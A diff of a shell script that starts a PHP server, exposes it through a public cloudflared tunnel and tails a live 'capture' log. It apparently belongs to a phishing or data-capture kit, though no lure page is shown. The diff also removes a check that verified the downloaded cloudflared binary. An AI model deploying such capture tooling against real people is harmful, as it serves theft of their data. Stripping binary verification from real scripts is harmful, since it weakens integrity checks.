@@ -106,15 +106,15 @@ require_cmd() {
       info "Installing $pkg (Termux)..."
       pkg install "$pkg" -y || die "Failed to install $pkg"
     elif [ "$PLATFORM" = "mac" ]; then
-      die "$cmd not found. Install it via: brew install $pkg"
+      die "$cmd not found. Install via: brew install $pkg"
     else
-      die "$cmd not found. Install it using your package manager."
+      die "$cmd not found. Install it via your package manager."
     fi
   fi
 }
 
 # --------------------------------------------------
-# Cloudflared setup (safe verification)
+# Cloudflared setup
 # --------------------------------------------------
 setup_cloudflared() {
   CLOUDFLARED="./cloudflared"
@@ -132,14 +132,6 @@ setup_cloudflared() {
   fi
 
   [ -x "$CLOUDFLARED" ] || die "Cloudflared is not executable"
-
-  if command -v file >/dev/null 2>&1; then
-    if [ "$PLATFORM" = "mac" ]; then
-      file "$CLOUDFLARED" | grep -qi "Mach-O" || die "Invalid macOS binary"
-    else
-      file "$CLOUDFLARED" | grep -qi "ELF" || die "Invalid Linux binary"
-    fi
-  fi
 
   ok "Cloudflared binary ready"
 }
@@ -170,11 +162,9 @@ trap cleanup INT TERM
 # Main
 # --------------------------------------------------
 detect_platform
-
 require_cmd bash bash
 require_cmd curl curl
 require_cmd php php
-
 setup_cloudflared
 
 mkdir -p capture
@@ -190,17 +180,31 @@ nohup "$CLOUDFLARED" tunnel \
   --protocol http2 \
   > "$TUNNEL_LOG" 2>&1 &
 CF_PID=$!
-
-sleep 6
 ok "Tunnel started"
 
-PUBLIC_URL=$(sed -n 's/.*\(https:\/\/[a-zA-Z0-9.-]*\.trycloudflare\.com\).*/\1/p' "$TUNNEL_LOG" | head -n1)
-[ -n "$PUBLIC_URL" ] && echo -e "${CYAN}${BOLD}[*] Public URL:${RESET} ${GREEN}$PUBLIC_URL${RESET}"
+# --------------------------------------------------
+# WAIT FOR PUBLIC URL (FIX)
+# --------------------------------------------------
+info "Waiting for public URL..."
+
+PUBLIC_URL=""
+for i in {1..25}; do
+  PUBLIC_URL=$(sed -n 's/.*\(https:\/\/[a-zA-Z0-9.-]*\.trycloudflare\.com\).*/\1/p' "$TUNNEL_LOG" | head -n1)
+  [ -n "$PUBLIC_URL" ] && break
+  sleep 1
+done
+
+if [ -n "$PUBLIC_URL" ]; then
+  echo -e "\n${CYAN}${BOLD}🌍 Public URL:${RESET} ${GREEN}$PUBLIC_URL${RESET}\n"
+else
+  echo -e "${YELLOW}[!] Tunnel running but URL not detected yet${RESET}"
+  echo -e "${YELLOW}    You can check manually: tail -f $TUNNEL_LOG${RESET}"
+fi
 
 # --------------------------------------------------
-# Live monitor
+# Live capture monitor
 # --------------------------------------------------
-echo -e "\n${BLUE}${BOLD}📡 LIVE CAPTURE MONITOR${RESET}"
+echo -e "${BLUE}${BOLD}📡 LIVE CAPTURE MONITOR${RESET}"
 echo -e "${BLUE}════════════════════════════════════════${RESET}"
 
 tail -n 0 -f "$CAPTURE_LOG" | while read -r line; do
